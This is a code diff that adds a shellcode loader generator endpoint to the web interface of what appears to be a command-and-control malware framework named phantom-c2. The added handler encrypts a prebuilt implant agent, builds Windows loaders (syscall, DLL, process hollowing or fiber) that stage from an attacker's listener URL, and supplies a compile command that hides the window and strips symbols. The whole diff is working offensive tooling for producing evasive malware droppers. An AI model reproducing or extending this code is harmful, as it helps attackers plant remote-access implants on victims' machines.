@@ -12,6 +12,7 @@ import (
 
 	"github.com/phantom-c2/phantom/internal/crypto"
 	"github.com/phantom-c2/phantom/internal/payloads"
+	"github.com/phantom-c2/phantom/internal/payloads/loader"
 )
 
 // PayloadRequest is the JSON body for payload generation.
@@ -514,4 +515,78 @@ func (w *WebUI) handleBackdoorGenerate(rw http.ResponseWriter, r *http.Request) 
 		"filepath": outPath,
 		"type":     req.Type,
 	})
+}
+
+// ══════════════════════════════════════════
+//  SHELLCODE LOADER GENERATOR
+// ══════════════════════════════════════════
+
+func (w *WebUI) handleLoaderGenerate(rw http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(rw, "POST required", 405)
+		return
+	}
+
+	var req struct {
+		ListenerURL string `json:"listener_url"`
+		LoaderType  string `json:"loader_type"` // syscall, dll, hollowing, fiber
+		AgentType   string `json:"agent_type"`  // exe, elf
+	}
+	json.NewDecoder(r.Body).Decode(&req)
+
+	if req.ListenerURL == "" {
+		writeJSON(rw, map[string]string{"error": "listener_url required"})
+		return
+	}
+	if req.LoaderType == "" {
+		req.LoaderType = "syscall"
+	}
+	if req.AgentType == "" {
+		req.AgentType = "exe"
+	}
+
+	root := findRoot()
+	outputDir := filepath.Join(root, "build", "loaders", req.LoaderType)
+
+	// Find the agent binary to encrypt
+	agentPath := filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
+	if req.AgentType == "elf" {
+		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
+	}
+	if _, err := os.Stat(agentPath); err != nil {
+		writeJSON(rw, map[string]string{"error": "Agent binary not found. Generate a payload first."})
+		return
+	}
+
+	cfg := loader.LoaderConfig{
+		StagerURL:  req.ListenerURL,
+		OutputDir:  outputDir,
+		LoaderType: req.LoaderType,
+		TargetOS:   "windows",
+		TargetArch: "amd64",
+	}
+
+	result, err := loader.GenerateLoader(agentPath, cfg)
+	if err != nil {
+		writeJSON(rw, map[string]string{"error": err.Error()})
+		return
+	}
+
+	resp := map[string]interface{}{
+		"success":           true,
+		"loader_type":       req.LoaderType,
+		"encrypted_payload": result.EncryptedPayload,
+		"key":              result.Key[:16] + "...",
+		"instructions":     result.Instructions,
+	}
+
+	if result.LoaderPath != "" {
+		resp["loader_path"] = result.LoaderPath
+		resp["message"] = fmt.Sprintf("Loader compiled: %s", result.LoaderPath)
+	} else {
+		resp["source_path"] = filepath.Join(outputDir, "loader.c")
+		resp["message"] = "Loader source generated. Compile with: x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet -s -mwindows"
+	}
+
+	writeJSON(rw, resp)
 }
